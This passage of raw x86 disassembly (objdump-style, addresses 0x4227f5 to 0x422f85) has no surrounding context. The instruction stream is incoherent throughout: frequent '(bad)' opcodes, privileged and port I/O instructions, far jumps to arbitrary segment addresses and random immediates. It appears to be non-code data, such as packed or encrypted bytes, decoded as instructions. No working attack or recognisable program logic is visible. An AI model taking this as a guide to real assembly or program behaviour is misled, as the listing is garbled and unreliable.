  4227f5:	or     BYTE PTR [edx+0x21fc3668],bl
  4227fb:	cwde   
  4227fc:	popa   
  4227fd:	xor    BYTE PTR [ecx],0x6
  422800:	add    edx,ebp
  422802:	js     0x4227e8
  422804:	into   
  422805:	retf   0xcd87
  422808:	push   eax
  42280a:	xchg   ecx,eax
  42280b:	jmp    0x92ef:0x95be797e
  422812:	into   
  422813:	mov    dh,0xf3
  422815:	xchg   BYTE PTR [edi-0x76],dh
  422818:	fbld   TBYTE PTR [edx+0xd]
  42281b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42281d:	loope  0x422824
  42281f:	sub    dh,BYTE PTR es:[eax]
  422822:	outs   dx,BYTE PTR ds:[esi]
  422823:	inc    ecx
  422824:	shl    BYTE PTR [edx+esi*2+0x6558cf69],cl
  42282b:	in     al,0x7c
  42282d:	mov    edx,DWORD PTR [esp+ebp*4+0x4c]
  422831:	rcr    BYTE PTR ds:0x1748496e,1
  422837:	cmp    BYTE PTR [ecx+0x79],cl
  42283a:	add    cl,BYTE PTR [ebx]
  42283c:	push   0xd
  42283e:	dec    esi
  42283f:	ja     0x422820
  422841:	fiadd  DWORD PTR [eax+0x1f]
  422844:	in     eax,0x5f
  422846:	inc    eax
  422847:	inc    edi
  422848:	pop    esp
  422849:	es cmp ebx,ecx
  42284c:	repnz in eax,0x3c
  42284f:	(bad)  
  422850:	lods   eax,DWORD PTR ds:[esi]
  422851:	inc    edx
  422853:	push   ebx
  422854:	add    edx,DWORD PTR [edi]
  422856:	fild   QWORD PTR [esi-0x47]
  422859:	adc    bh,BYTE PTR [edx-0x54]
  42285c:	arpl   WORD PTR [esi-0x49],ax
  42285f:	retf   0x72e4
  422862:	mov    edi,0x96ef5249
  422867:	or     al,0x58
  422869:	outs   dx,DWORD PTR ds:[esi]
  42286a:	push   ecx
  42286b:	mov    ecx,0x1588b029
  422870:	inc    ebx
  422871:	pop    esp
  422872:	jnp    0x4228d7
  422874:	jle    0x422865
  422876:	test   DWORD PTR [ecx+edi*2-0x24706d5a],edi
  42287d:	mov    ecx,fs
  42287f:	or     bh,BYTE PTR [ecx-0x27]
  422882:	xorps  xmm7,xmm6
  422885:	stos   DWORD PTR es:[edi],eax
  422886:	add    edx,edi
  422888:	pop    ds
  422889:	in     eax,0x5
  42288b:	cli    
  42288c:	das    
  42288d:	push   esi
  42288e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42288f:	cmp    BYTE PTR [esi+0x7],cl
  422892:	mov    esp,0xf290cbcf
  422897:	into   
  422898:	fs cmp eax,0xb5de8e23
  42289e:	nop
  42289f:	mov    al,0xd6
  4228a1:	fnstsw WORD PTR [ebp+0x59aba3fe]
  4228a7:	imul   ebp,DWORD PTR [esi+edi*8],0xf5d2a55c
  4228ae:	call   0x93763872
  4228b3:	lahf   
  4228b4:	mov    ch,0xe6
  4228b6:	popa   
  4228b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228b8:	add    al,bh
  4228ba:	jo     0x422855
  4228bc:	sbb    DWORD PTR [ecx],ebp
  4228be:	pop    ecx
  4228bf:	gs mov esi,0xda6ec3c0
  4228c5:	adc    DWORD PTR ds:0x7efe0b81,0xffffffa9
  4228cc:	imul   eax,DWORD PTR [ebx],0x8c090477
  4228d2:	inc    edi
  4228d3:	cmp    bl,ah
  4228d5:	fisttp WORD PTR [ecx+0x79]
  4228d8:	and    al,0x98
  4228da:	aaa    
  4228db:	mov    ah,0x7
  4228dd:	ret    0x6b7d
  4228e0:	sbb    eax,0xffa2363d
  4228e6:	sbb    dh,BYTE PTR [ebx]
  4228e8:	push   cs
  4228e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228ea:	or     eax,0xa80c0576
  4228ef:	pop    edi
  4228f0:	loope  0x42289a
  4228f2:	ficom  DWORD PTR [edx]
  4228f4:	gs jl  0x422942
  4228f7:	ds call 0x11fb:0x8a5ad49
  4228ff:	pop    esp
  422900:	dec    ebx
  422901:	jo     0x4228dd
  422903:	daa    
  422904:	mov    BYTE PTR [ecx+ecx*8+0x24],bh
  422908:	hlt    
  422909:	fsubr  QWORD PTR [ebx+0x1f]
  42290c:	mov    cl,0x21
  42290e:	mov    edi,0x1534d409
  422913:	sbb    esp,DWORD PTR [esi+0x6e850e49]
  422919:	sbb    BYTE PTR [edi+0x47],0xd1
  42291d:	sbb    ch,BYTE PTR [esi+0x1a]
  422920:	jo     0x4228a3
  422922:	cmc    
  422923:	push   esi
  422924:	dec    edx
  422925:	cmp    eax,0xa3aa2e6e
  42292a:	mov    cs,WORD PTR ds:0xfd2bd98f
  422930:	sbb    dl,BYTE PTR [eax]
  422932:	jno    0x422992
  422934:	sub    eax,0x94980074
  422939:	xor    eax,0x737efbc2
  42293e:	lahf   
  42293f:	retf   0xfdfa
  422942:	mov    WORD PTR ds:0x3a7c349,es
  422948:	mov    esi,0x45d8b6f8
  42294d:	or     al,0xa5
  42294f:	rcr    DWORD PTR [esi+ebp*4+0x6099d852],0x9e
  422957:	cmp    ecx,DWORD PTR [ebp-0x5a012309]
  42295d:	clc    
  42295e:	mov    al,ds:0x50b51781
  422963:	jmp    0xdc818a1a
  422968:	or     ebx,DWORD PTR [eax-0x35]
  42296b:	xrelease mov DWORD PTR [ebp+0x20],ebx
  42296f:	xchg   dh,al
  422971:	dec    esi
  422972:	dec    esp
  422973:	push   0x7f25c6d1
  422978:	test   al,0x89
  42297a:	js     0x4229da
  42297c:	repnz pusha 
  42297e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42297f:	bound  esi,QWORD PTR [esi-0x7]
  422982:	dec    edx
  422983:	xor    cl,BYTE PTR [esi-0x13]
  422986:	ja     0x4229f8
  422988:	call   0x4c5d8bfd
  42298d:	jmp    0x4229b1
  42298f:	fwait
  422990:	xchg   ecx,eax
  422991:	sti    
  422992:	pop    esi
  422993:	popa   
  422994:	jmp    0xa55bfaa8
  422999:	in     eax,0x7e
  42299b:	sbb    ebx,edx
  42299d:	dec    ebp
  42299e:	imul   ebp,ebp,0x33f75cc1
  4229a4:	xchg   esp,eax
  4229a5:	jmp    0x5a8a:0xb8ef10e9
  4229ac:	mov    bl,0x86
  4229ae:	gs or  al,0xe5
  4229b1:	(bad)  
  4229b2:	(bad)  
  4229b3:	je     0x42297d
  4229b5:	(bad)  
  4229b6:	in     al,dx
  4229b7:	pop    edx
  4229b8:	ret    
  4229b9:	jmp    0xcafc29e2
  4229be:	test   eax,0xac98e1d2
  4229c3:	aad    0xa5
  4229c5:	loop   0x4229e2
  4229c7:	fnstsw WORD PTR [esi+esi*2]
  4229ca:	dec    edx
  4229cb:	push   esi
  4229cc:	mov    ecx,0x24195841
  4229d1:	bound  esi,QWORD PTR [edi+esi*8]
  4229d4:	and    ebp,ebx
  4229d6:	pop    eax
  4229d7:	push   0xab201bfe
  4229dc:	jmp    FWORD PTR [ebx+ebp*8+0x27]
  4229e0:	xchg   ecx,eax
  4229e1:	lock mov esp,esi
  4229e4:	daa    
  4229e5:	pop    ebp
  4229e6:	into   
  4229e7:	bswap  ecx
  4229e9:	lock xlat BYTE PTR ds:[ebx]
  4229eb:	inc    esi
  4229ec:	jmp    0x6cc4:0x66c98c25
  4229f3:	sbb    al,0x23
  4229f5:	mov    edx,0xab17e0f5
  4229fa:	xchg   esp,eax
  4229fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229fc:	inc    esp
  4229fd:	cmp    DWORD PTR [eax-0x57],0x9f15eae1
  422a04:	mov    ah,0x92
  422a06:	repz xor al,BYTE PTR [ebp-0x39b6d906]
  422a0d:	mov    eax,0xf9cb4fd6
  422a12:	stos   DWORD PTR es:[edi],eax
  422a13:	push   ecx
  422a14:	stos   BYTE PTR es:[edi],al
  422a15:	jnp    0x422a10
  422a17:	repz jmp DWORD PTR ds:0x68865035
  422a1e:	inc    ebx
  422a1f:	jecxz  0x4229e2
  422a21:	std    
  422a22:	inc    ecx
  422a23:	mov    dh,0x59
  422a25:	lock cmp BYTE PTR [ebx],ah
  422a28:	lahf   
  422a29:	ror    DWORD PTR [edx-0x5e836026],1
  422a2f:	das    
  422a30:	jno    0xe2ac168d
  422a36:	int    0x3e
  422a38:	ror    BYTE PTR [edx+0xaa4dc73],0xc0
  422a3f:	push   ds
  422a40:	mov    esi,edx
  422a42:	xor    eax,DWORD PTR [ebp+0x22]
  422a45:	into   
  422a46:	test   eax,0x91d35ed8
  422a4b:	mov    DWORD PTR [edi+0x75],esi
  422a4e:	sbb    eax,0x290f3756
  422a53:	sbb    al,0x4d
  422a55:	imul   ecx,DWORD PTR [edi-0x6d],0x3e930aab
  422a5c:	out    0xb4,eax
  422a5e:	in     eax,dx
  422a5f:	xchg   esp,eax
  422a60:	push   es
  422a61:	jg     0x422aa7
  422a63:	pop    ebp
  422a64:	mov    ss,WORD PTR [esi]
  422a66:	mov    esp,ecx
  422a68:	hlt    
  422a69:	add    al,0x42
  422a6b:	add    BYTE PTR [ebx+0x3e7624d6],al
  422a71:	nop
  422a72:	push   ebx
  422a73:	enter  0x5360,0x1a
  422a77:	jp     0x422ab7
  422a79:	daa    
  422a7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a7b:	mov    edi,0x4a918e8a
  422a80:	jae    0x422abc
  422a82:	popa   
  422a83:	loop   0x422a3d
  422a85:	pop    edi
  422a86:	or     cl,al
  422a88:	dec    ebp
  422a89:	outs   dx,DWORD PTR ds:[esi]
  422a8a:	sbb    DWORD PTR [edx+eax*8+0x8],ebx
  422a8e:	mov    ecx,0x80f367fe
  422a93:	add    al,0x24
  422a95:	xchg   edx,eax
  422a96:	sub    eax,0xe41e5b61
  422a9b:	jno    0x422ac2
  422a9d:	loopne 0x422a3c
  422a9f:	aas    
  422aa0:	cmc    
  422aa1:	cmc    
  422aa2:	xchg   ebx,eax
  422aa3:	inc    ecx
  422aa4:	enter  0x5f0b,0xe8
  422aa8:	mov    al,0x79
  422aaa:	and    al,0xfc
  422aac:	pop    eax
  422aad:	cmp    eax,0x579b4114
  422ab2:	std    
  422ab3:	cdq    
  422ab4:	ror    BYTE PTR [eax+eax*2-0x34],cl
  422ab8:	cmp    edx,edi
  422aba:	fcmovb st,st(7)
  422abc:	popf   
  422abd:	jle    0x422b28
  422abf:	pop    edi
  422ac0:	dec    ecx
  422ac1:	jns    0x422add
  422ac3:	test   al,0x34
  422ac5:	add    esi,esp
  422ac7:	mov    cl,0x38
  422ac9:	pusha  
  422aca:	std    
  422acb:	and    ch,dh
  422acd:	or     DWORD PTR [eax],eax
  422acf:	add    BYTE PTR [eax],al
  422ad1:	add    BYTE PTR [edx-0x29],ah
  422ad4:	hlt    
  422ad5:	push   ebp
  422ad7:	jmp    FWORD PTR [ebx-0x21]
  422ada:	sub    al,0x7c
  422adc:	cmp    BYTE PTR [edx+0x112398c9],bh
  422ae2:	and    DWORD PTR [ecx+eax*1+0x4f400],0xaa5cc00
  422aed:	mov    dh,BYTE PTR [edi-0x53861073]
  422af3:	inc    esi
  422af4:	ins    BYTE PTR es:[edi],dx
  422af5:	push   esi
  422af6:	add    ebp,ebp
  422af8:	mov    WORD PTR [edi+edi*8+0x5b],?
  422afc:	call   0xac0a:0x77ee081a
  422b03:	mov    dh,BYTE PTR [eax-0x7ed864a2]
  422b09:	adc    ch,BYTE PTR [ecx+ebx*8+0x6ad55915]
  422b10:	and    eax,0x770b2db0
  422b15:	call   0x2206:0x3b63ac86
  422b1c:	(bad)  
  422b1d:	sub    al,0xc6
  422b1f:	inc    ebx
  422b20:	mov    eax,ds:0x82217681
  422b25:	jl     0x422b2f
  422b27:	and    eax,0x3d20c892
  422b2c:	xlat   BYTE PTR ds:[ebx]
  422b2d:	dec    eax
  422b2e:	frstor [esi+0x24]
  422b31:	jmp    0xbb0f5a0d
  422b36:	mov    WORD PTR [ecx+0x74dd6455],cs
  422b3c:	xchg   ebx,eax
  422b3d:	mov    eax,ds:0x3c455508
  422b42:	inc    esi
  422b43:	inc    ebx
  422b44:	out    0xc7,al
  422b46:	int    0xe3
  422b48:	fisubr DWORD PTR [esi-0x1cce9d6]
  422b4e:	(bad)  
  422b50:	cmp    bl,BYTE PTR [esi+0x24]
  422b53:	popf   
  422b54:	or     al,0xa6
  422b56:	push   eax
  422b57:	or     DWORD PTR [di-0x5bc],edx
  422b5c:	jmp    0x8c1bb4d3
  422b61:	les    esi,FWORD PTR [ebp-0x70]
  422b64:	in     al,dx
  422b65:	cmp    DWORD PTR [eax+0x405f0630],eax
  422b6b:	or     eax,0x56311a75
  422b70:	inc    ebx
  422b71:	mov    al,ds:0x5e42a8a6
  422b76:	sahf   
  422b77:	inc    BYTE PTR [eax+0x71]
  422b7a:	xor    DWORD PTR [edi+0x70],edi
  422b7d:	sahf   
  422b7e:	repz add edi,DWORD PTR [edi+0x8]
  422b82:	int3   
  422b83:	(bad)  
  422b84:	sti    
  422b85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b86:	cmp    eax,0x385ffa62
  422b8b:	ins    DWORD PTR es:[edi],dx
  422b8c:	xor    al,BYTE PTR [eax-0x6e39e02a]
  422b92:	es leave 
  422b94:	push   ecx
  422b95:	or     edx,0x5d
  422b98:	clc    
  422b99:	cli    
  422b9a:	jl     0x422be2
  422b9c:	pop    ebx
  422b9d:	out    0x46,eax
  422b9f:	jnp    0x422b35
  422ba1:	in     al,0x32
  422ba3:	loope  0x422b26
  422ba5:	das    
  422ba6:	push   edx
  422ba7:	aas    
  422ba8:	(bad)  
  422ba9:	gs pop esi
  422bab:	sub    eax,0x5b4b353f
  422bb0:	xchg   ebx,eax
  422bb1:	shr    DWORD PTR [esi+0x39c7a33f],cl
  422bb7:	daa    
  422bb8:	sbb    edi,DWORD PTR [edi-0x26]
  422bbb:	adc    eax,0x6e74e2a2
  422bc0:	adc    bh,BYTE PTR [ecx-0x7e]
  422bc3:	ror    BYTE PTR [ebx+0xe],1
  422bc6:	icebp  
  422bc7:	dec    ebp
  422bc8:	push   0xffffffed
  422bca:	or     DWORD PTR [esi],edx
  422bcc:	jmp    0xafa739ee
  422bd1:	push   edi
  422bd2:	sub    eax,0xcb06d54b
  422bd7:	into   
  422bd8:	fnsave [ecx]
  422bda:	mov    WORD PTR [edx-0x1542a6bb],?
  422be0:	pop    edx
  422be1:	mov    al,ds:0x2012320a
  422be6:	ffree  st(4)
  422be8:	imul   edx,DWORD PTR [ebx],0xffffff88
  422beb:	xchg   ebp,eax
  422bec:	sub    ch,ch
  422bee:	xchg   ebp,eax
  422bef:	loope  0x422b94
  422bf1:	ror    BYTE PTR [ebx+0x6f],1
  422bf4:	push   ecx
  422bf5:	xor    ecx,DWORD PTR ss:[edi]
  422bf8:	pop    ds
  422bf9:	enter  0x3d7,0x33
  422bfd:	adc    DWORD PTR [eax+0x66d8a611],esp
  422c03:	mov    bl,0x53
  422c05:	popf   
  422c06:	cs pop es
  422c08:	add    esp,ecx
  422c0a:	or     dh,ch
  422c0c:	std    
  422c0d:	pop    ss
  422c0e:	bound  ecx,QWORD PTR [ebx-0x20c95fef]
  422c14:	mov    ds:0xf3b82049,al
  422c19:	cmp    al,0x32
  422c1b:	jl     0x422c44
  422c1d:	dec    esi
  422c1e:	mov    dl,0xdc
  422c20:	popf   
  422c21:	neg    DWORD PTR [eax]
  422c23:	push   ds
  422c24:	fisttp QWORD PTR [eax-0x36]
  422c27:	hlt    
  422c28:	stos   BYTE PTR es:[edi],al
  422c29:	sub    DWORD PTR [edx+0x3350cc02],eax
  422c2f:	push   edx
  422c30:	nop
  422c31:	ror    ch,cl
  422c33:	cmp    BYTE PTR [edi+0x33],dh
  422c36:	(bad)
  422c39:	inc    DWORD PTR [eax]
  422c3b:	outs   dx,BYTE PTR ds:[esi]
  422c3c:	(bad)  
  422c3e:	in     eax,dx
  422c3f:	add    edi,DWORD PTR [eax-0x1a]
  422c42:	pop    ecx
  422c43:	leave  
  422c44:	loopne 0x422c9c
  422c46:	jne    0x422c2e
  422c48:	scas   al,BYTE PTR es:[edi]
  422c49:	call   0xa29:0xc5f274d6
  422c50:	fist   DWORD PTR [eax]
  422c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c53:	sub    eax,0x2f51913
  422c58:	inc    edi
  422c59:	inc    ebp
  422c5a:	inc    ebp
  422c5b:	scas   eax,DWORD PTR es:[edi]
  422c5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c5d:	scas   al,BYTE PTR es:[edi]
  422c5e:	jle    0x422be5
  422c60:	(bad)  
  422c61:	jmp    0xad45:0x4b31e187
  422c68:	scas   eax,DWORD PTR es:[edi]
  422c69:	lahf   
  422c6a:	xor    ebx,DWORD PTR [ebx]
  422c6c:	(bad)  
  422c6d:	or     BYTE PTR [edx+0x4d867134],dl
  422c73:	arpl   ax,sp
  422c75:	mul    BYTE PTR [ecx+0x7709b6e8]
  422c7b:	fs inc ebp
  422c7d:	retf   
  422c7e:	push   ss
  422c7f:	ret    
  422c80:	push   DWORD PTR [ebp-0x43]
  422c83:	push   ss
  422c84:	stos   DWORD PTR es:[edi],eax
  422c85:	lahf   
  422c86:	ret    0xd0c6
  422c89:	mov    cl,0x84
  422c8b:	cli    
  422c8c:	mov    BYTE PTR [ecx-0x18],cl
  422c8f:	sbb    al,0x4e
  422c91:	in     al,0x47
  422c93:	stos   BYTE PTR es:[edi],al
  422c94:	push   ecx
  422c95:	mov    bl,0x61
  422c97:	jecxz  0x422c9d
  422c99:	jo     0x422cb8
  422c9b:	xor    edi,DWORD PTR [edi+0x138c15b1]
  422ca1:	pusha  
  422ca2:	push   0x79
  422ca4:	adc    ebx,DWORD PTR [edi+0x3f]
  422ca7:	stc    
  422ca8:	push   cs
  422ca9:	sbb    al,BYTE PTR [ebp+0x11]
  422cac:	push   ecx
  422cad:	mov    al,BYTE PTR [ecx+0x7b]
  422cb0:	mov    eax,0xe7643ab2
  422cb5:	pop    ebp
  422cb6:	push   eax
  422cb7:	xchg   edx,eax
  422cb8:	mul    DWORD PTR [esi-0x61]
  422cbb:	sahf   
  422cbc:	and    BYTE PTR [esi+0x535dc4bb],dh
  422cc2:	scas   eax,DWORD PTR es:[edi]
  422cc3:	ins    BYTE PTR es:[edi],dx
  422cc4:	mov    ebp,0x70e7bc1b
  422cc9:	outs   dx,DWORD PTR ds:[esi]
  422cca:	lds    edi,FWORD PTR [ecx-0x7df94d73]
  422cd0:	test   BYTE PTR [eax-0x853d088],ah
  422cd6:	mov    ds:0xdbbd6612,eax
  422cdb:	je     0x422d2c
  422cdd:	or     BYTE PTR ss:[ecx-0x4cf84301],dh
  422ce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ce5:	xchg   ebx,eax
  422ce6:	stc    
  422ce7:	out    dx,eax
  422ce8:	or     al,0x71
  422cea:	daa    
  422ceb:	int    0x85
  422ced:	mov    dh,0x8d
  422cef:	push   es
  422cf0:	pop    es
  422cf1:	arpl   WORD PTR [edi-0x2c],si
  422cf4:	jp     0x422d26
  422cf6:	cs push 0xffffffee
  422cf9:	xchg   edx,eax
  422cfa:	add    cl,BYTE PTR [edi+ecx*4]
  422cfd:	adc    al,0xe0
  422cff:	dec    eax
  422d00:	and    ah,BYTE PTR [edi]
  422d02:	jnp    0x422d3f
  422d04:	push   esi
  422d05:	ret    0xf4e7
  422d08:	inc    edi
  422d09:	pop    esi
  422d0a:	push   esp
  422d0b:	cmp    DWORD PTR [ebx-0x51],ebp
  422d0e:	out    dx,al
  422d0f:	and    al,0xdb
  422d11:	addr16 out 0xee,eax
  422d14:	pop    ebp
  422d15:	ja     0x422d60
  422d17:	arpl   WORD PTR [eax+ebp*4],ax
  422d1a:	cmc    
  422d1b:	add    edx,ecx
  422d1d:	scas   al,BYTE PTR es:[edi]
  422d1e:	cmp    BYTE PTR [esi+0x5099eab1],bh
  422d24:	or     al,0xe8
  422d26:	mov    edx,0x141f6bf9
  422d2b:	push   ss
  422d2c:	mov    al,ds:0x57412e72
  422d31:	outs   dx,BYTE PTR ds:[esi]
  422d32:	outs   dx,BYTE PTR ds:[esi]
  422d33:	leave  
  422d34:	fild   DWORD PTR [eax-0x68]
  422d37:	jne    0x422d29
  422d39:	inc    ebp
  422d3a:	push   esp
  422d3b:	xchg   DWORD PTR [ebp+0x5d],esi
  422d3e:	jle    0x422ce2
  422d40:	cmp    eax,DWORD PTR [ebx-0x9666cb3]
  422d46:	(bad)  [ecx+eiz*1-0x28]
  422d4a:	idiv   dl
  422d4c:	dec    ebx
  422d4d:	mov    ebp,0xad8d0f64
  422d52:	(bad)  
  422d53:	jmp    0x422d03
  422d55:	std    
  422d56:	cli    
  422d57:	dec    esi
  422d58:	retf   
  422d59:	scas   eax,DWORD PTR es:[edi]
  422d5a:	mov    esp,0xcb67e1b9
  422d5f:	cmp    al,0xe2
  422d61:	repnz dec eax
  422d63:	daa    
  422d64:	sbb    al,0x5d
  422d66:	dec    esi
  422d67:	fs jmp 0x422d21
  422d6a:	loope  0x422cf5
  422d6c:	jl     0x422dba
  422d6e:	push   eax
  422d6f:	push   0x3e
  422d71:	loope  0x422d8c
  422d73:	ss pop ecx
  422d75:	nop
  422d76:	mov    ds:0xaffa80be,al
  422d7b:	jl     0x422d85
  422d7d:	inc    ecx
  422d7e:	fadd   DWORD PTR [eax]
  422d80:	mov    ebp,0xcbea97de
  422d85:	add    eax,DWORD PTR [edx]
  422d87:	pop    ss
  422d88:	adc    al,0xba
  422d8a:	nop
  422d8b:	xor    BYTE PTR [edx+ebx*4+0x68],dh
  422d8f:	mov    sp,?
  422d92:	push   ds
  422d93:	test   BYTE PTR [ebx],0xd0
  422d96:	test   al,0x96
  422d99:	ds cmp BYTE PTR es:[eax-0x5f],ah
  422d9e:	jmp    0x74ef3abd
  422da3:	mov    WORD PTR [esp+ecx*8-0x61699c96],es
  422daa:	push   edi
  422dab:	adc    eax,0x3ab632bb
  422db0:	mov    WORD PTR [edi-0x2c8ae87c],?
  422db6:	sub    al,0x80
  422db8:	or     esp,DWORD PTR [ebx]
  422dba:	mov    ecx,0x7f0bbd70
  422dc0:	lahf   
  422dc1:	or     al,BYTE PTR [ebp+0x5c3fb66d]
  422dc7:	inc    esp
  422dc8:	push   es
  422dc9:	imul   eax,ecx,0x22
  422dcc:	sbb    DWORD PTR ds:0x6d52db5,0x3d
  422dd3:	lds    edi,FWORD PTR [ecx+0x2b848861]
  422dd9:	cmp    edx,DWORD PTR [esp+esi*8]
  422ddc:	jmp    DWORD PTR [ebx+0x5aafa974]
  422de2:	neg    BYTE PTR [eax+eiz*1]
  422de5:	push   edi
  422de6:	iret   
  422de7:	dec    edi
  422de8:	lods   al,BYTE PTR ds:[esi]
  422de9:	add    DWORD PTR [edi-0x70],0xffffffb3
  422ded:	(bad)  [edi+eax*4-0x56]
  422df1:	shr    DWORD PTR [ecx+ecx*4-0x6cebee15],1
  422df8:	xchg   esi,eax
  422df9:	sti    
  422dfa:	addr16 dec edi
  422dfc:	adc    al,0x9d
  422dfe:	ds pop ds
  422e00:	test   al,0x9f
  422e02:	ret    
  422e03:	push   ebx
  422e04:	xlat   BYTE PTR ds:[ebx]
  422e05:	aam    0x80
  422e07:	jb     0x422e70
  422e09:	sub    BYTE PTR [ecx+0x4d],bl
  422e0c:	fisttp DWORD PTR [ebx+0x16]
  422e0f:	push   ecx
  422e10:	ins    DWORD PTR es:[edi],dx
  422e11:	inc    edx
  422e12:	pop    ecx
  422e13:	or     al,0xdf
  422e15:	adc    eax,0x21c08cfc
  422e1a:	retf   
  422e1b:	std    
  422e1c:	shl    BYTE PTR [edi-0x42c5911a],cl
  422e22:	xor    BYTE PTR [ecx-0x2d],dl
  422e25:	cdq    
  422e26:	push   edx
  422e27:	mov    ebx,0xad92330d
  422e2c:	fmul   QWORD PTR [ecx]
  422e2e:	(bad)  
  422e2f:	fist   WORD PTR [ecx]
  422e31:	adc    al,0x73
  422e33:	mov    ch,0xe0
  422e35:	aaa    
  422e36:	pop    esp
  422e37:	inc    edi
  422e38:	or     ch,BYTE PTR [edx-0x5298daeb]
  422e3e:	jnp    0x422df6
  422e40:	xchg   ebp,eax
  422e41:	or     ebp,DWORD PTR [esi]
  422e43:	enter  0xd55c,0x5a
  422e47:	idiv   edi
  422e49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e4a:	pop    edx
  422e4b:	imul   edx,DWORD PTR es:[esi-0x54],0x117dfa70
  422e53:	add    al,0x89
  422e55:	xchg   edi,eax
  422e56:	imul   edx,DWORD PTR [eax+0x6cfa2b0e],0xcd6d8919
  422e60:	fdiv   DWORD PTR [ebp+0x16]
  422e63:	leave  
  422e64:	in     eax,dx
  422e65:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e67:	lock out dx,eax
  422e69:	retf   0xd755
  422e6c:	cld    
  422e6d:	fmulp  st(4),st
  422e6f:	cmp    esp,DWORD PTR [edi+0x5bdad4e6]
  422e75:	cmc    
  422e76:	fnstcw WORD PTR [eax]
  422e78:	push   ds
  422e79:	dec    ebp
  422e7a:	out    dx,al
  422e7b:	add    edx,eax
  422e7d:	adc    ah,al
  422e7f:	or     esp,esp
  422e81:	push   ebx
  422e82:	mov    ah,0x38
  422e84:	mov    ah,0xfd
  422e86:	xchg   esp,eax
  422e87:	jle    0x422e8e
  422e89:	ins    BYTE PTR es:[edi],dx
  422e8a:	data16 mov ch,0x53
  422e8d:	out    0x47,al
  422e8f:	stc    
  422e90:	xlat   BYTE PTR ds:[ebx]
  422e91:	idiv   BYTE PTR [edi-0x47]
  422e94:	mov    al,ds:0x181d3b5d
  422e99:	dec    ebx
  422e9a:	push   0x24f28231
  422e9f:	pop    ecx
  422ea0:	add    BYTE PTR [esi-0x77],dh
  422ea3:	pop    ebx
  422ea4:	jg     0x422e6d
  422ea6:	adc    eax,0x9839f024
  422eab:	jl     0x422e7d
  422ead:	(bad)  
  422eae:	xchg   ebp,eax
  422eaf:	out    dx,eax
  422eb0:	inc    esi
  422eb1:	stc    
  422eb2:	sub    cl,BYTE PTR [edi]
  422eb4:	inc    esi
  422eb5:	push   esp
  422eb6:	jmp    0x422e49
  422eb8:	sub    eax,0x47dd844c
  422ebd:	fiadd  WORD PTR [ecx+edi*2]
  422ec0:	ds cmc 
  422ec2:	lds    edx,FWORD PTR [esi-0x53]
  422ec5:	cmp    DWORD PTR [esi+0x31],ebp
  422ec8:	shr    DWORD PTR [edx],1
  422eca:	jb     0x422f4a
  422ecc:	lock hlt 
  422ece:	mov    al,BYTE PTR [esi-0x552ff14d]
  422ed4:	imul   ecx,ebp,0xffffffe0
  422ed7:	lods   al,BYTE PTR ds:[esi]
  422ed8:	mov    eax,ds:0xd0a79a10
  422edd:	pop    ds
  422ede:	push   0x11b14ab9
  422ee3:	int3   
  422ee4:	jmp    0x7a7b97e8
  422ee9:	pop    ecx
  422eea:	loopne 0x422f20
  422eec:	(bad)  
  422eed:	adc    DWORD PTR [edx-0x7a575092],esp
  422ef3:	pusha  
  422ef4:	std    
  422ef5:	mov    edi,0xf5adf5c8
  422efa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422efb:	fstp   QWORD PTR [ebp-0x303a65b0]
  422f01:	inc    esi
  422f02:	mov    ch,0x74
  422f04:	mov    WORD PTR ds:0x24e15170,ds
  422f0a:	jb     0x422f52
  422f0c:	int3   
  422f0d:	dec    ecx
  422f0e:	xchg   esp,eax
  422f0f:	pop    es
  422f10:	adc    edi,DWORD PTR [ebx]
  422f12:	out    dx,eax
  422f13:	mov    ch,bl
  422f15:	ds jmp 0x55ba686
  422f1b:	lea    ecx,[ebx+0x6468509d]
  422f21:	sub    al,0xbf
  422f23:	jecxz  0x422f31
  422f25:	(bad)  
  422f26:	fist   DWORD PTR [eax-0x4216a6c5]
  422f2c:	mov    cl,0xe4
  422f2e:	jle    0x422f77
  422f30:	(bad)  
  422f31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f32:	push   ds
  422f33:	ins    BYTE PTR es:[edi],dx
  422f34:	fdivr  st,st(0)
  422f36:	js     0x422eca
  422f38:	outs   dx,DWORD PTR ds:[esi]
  422f39:	mov    DWORD PTR [eax],eax
  422f3b:	mov    ch,BYTE PTR [edi+0x4e]
  422f3e:	arpl   WORD PTR [edi+0x3],di
  422f41:	mov    bh,0xa0
  422f43:	imul   esp,DWORD PTR [ecx-0x19],0xffffffd2
  422f47:	pop    ds
  422f48:	call   0xf4b7:0x9e2b861b
  422f4f:	clc    
  422f50:	dec    edi
  422f51:	xor    BYTE PTR [edx],0xcf
  422f54:	push   cs
  422f55:	stos   DWORD PTR es:[edi],eax
  422f56:	jae    0x422f49
  422f58:	xchg   ebp,eax
  422f59:	push   ds
  422f5a:	jg     0x422fcc
  422f5c:	fwait
  422f5d:	jp     0x422f81
  422f5f:	or     BYTE PTR [ebx],bh
  422f61:	fimul  DWORD PTR [eax]
  422f63:	xlat   BYTE PTR ds:[ebx]
  422f64:	adc    al,0x96
  422f66:	test   al,0x8a
  422f68:	jae    0x422fcb
  422f6a:	dec    esi
  422f6b:	nop
  422f6c:	cld    
  422f6d:	pop    es
  422f6e:	aaa    
  422f6f:	and    bl,bl
  422f71:	xchg   esp,eax
  422f72:	mov    dh,BYTE PTR [ecx]
  422f74:	ss add al,0x72
  422f77:	test   BYTE PTR [edi],0xd7
  422f7a:	xchg   edx,eax
  422f7b:	xchg   ebp,eax
  422f7c:	imul   eax,DWORD PTR [esi],0xe009891d
  422f82:	lods   eax,DWORD PTR ds:[esi]
  422f83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f84:	int3   
  422f85:	mov    bl,0xc1
